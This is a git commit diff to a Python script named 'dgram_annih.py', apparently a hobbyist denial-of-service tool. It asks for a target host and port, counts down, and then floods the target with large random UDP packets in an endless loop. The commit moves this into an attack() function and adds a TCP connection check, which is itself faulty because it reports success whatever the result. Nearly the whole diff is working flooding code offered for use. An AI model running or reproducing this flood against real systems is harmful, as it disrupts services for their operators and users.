5587374f4bf34dd9bbcbd0e71b1968dc42a87a19
h0nt3d <akanoim@gmail.com>
2025-05-23 17:20:28 +0000

    Moved functionaity to special functions and changed parameter for testing connection to TCP

--- dgram_annih.py
+++ dgram_annih.py
@@ -2,10 +2,29 @@ import socket
 import random
 import os
 import time
+import sys
 
-bytes = random._urandom(47680)
+def checkForTarget(ip, port):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        connection = s.connect_ex((ip, int(port)))
+        s.shutdown(2)
+        return True
+    except:
+        return False
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+def attack(ip, port):
+    countdown = 5
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(47680)
+    while countdown > 0:
+        print("Attack Starting in " + str(countdown))
+        countdown = countdown - 1
+        time.sleep(0.5)
+
+    while True:
+         s.sendto(bytes, (ip, int(port)))
+         print ("Sent bytes" + " to " + ip + ", port: " + str(port))
 
 print("▗▄▄▄   ▗▄▄▖▗▄▄▖  ▗▄▖ ▗▖  ▗▖     ▗▄▖ ▗▖  ▗▖▗▖  ▗▖▗▄▄▄▖▗▖ ▗▖▗▄▄▄▖▗▖    ▗▄▖▗▄▄▄▖▗▄▖ ▗▄▄▖ ")
 print("▐▌  █ ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▛▚▞▜▌    ▐▌ ▐▌▐▛▚▖▐▌▐▛▚▖▐▌  █  ▐▌ ▐▌  █  ▐▌   ▐▌ ▐▌ █ ▐▌ ▐▌▐▌ ▐▌")
@@ -15,13 +34,11 @@ print("▐▙▄▄▀ ▝▚▄▞▘▐▌ ▐▌▐▌ ▐▌▐▌  ▐▌  
 ip = input("Enter Host Adress: ")
 port = input("Enter port number: ")
 
-countdown = 5
-os.system("clear")
-while countdown > 0:
-    print("Attack Starting in " + str(countdown))
-    countdown = countdown - 1
-    time.sleep(0.5)
 
-while True:
-     sock.sendto(bytes, (ip, int(port)))
-     print ("Sent bytes" + " to " + ip + ", port: " + str(port))
+if checkForTarget(ip, port) == True:
+    print("Host Connected")
+    attack(ip, port)
+
+else:
+    print("Host connection failed")
+
